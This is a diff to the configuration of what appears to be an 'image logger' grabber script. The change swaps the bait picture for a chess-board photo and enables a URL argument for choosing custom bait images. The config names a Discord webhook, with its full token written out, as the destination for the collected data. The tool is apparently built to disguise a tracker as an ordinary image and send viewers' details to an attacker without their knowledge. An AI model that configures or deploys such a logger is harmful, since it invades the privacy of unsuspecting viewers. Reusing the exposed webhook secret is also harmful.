@@ -15,9 +15,9 @@ __author__ = "fishyramen"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1523600445824827403/BnbY7nEx9vPmba66zrgR8QfGDyU_iWHLKVveAhxVgWKCc9aRfd5aNRDtjQBDB6LZUh_A",
-    "image": "https://imgs.search.brave.com/fO9A7Dq93IzbhhYCSnQuhEKkvkyWfzkOR3O7xP6Cm7Q/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9kcm9w/bHIuY29tL3dwLWNv/bnRlbnQvdXBsb2Fk/cy8yMDIwLzEwL2No/ZXNzYm9hcmQucG5n", # You can also have a custom image by using a URL argument
+    "image": "https://media.gettyimages.com/id/644106662/photo/chess-board.jpg?s=612x612&w=0&k=20&c=nVEI9j-sBrJGyPmLAoj0zN80koEvPbIf_nUlhLnkNXQ=", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "snatch blue", # Set this to the name you want the webhook to have
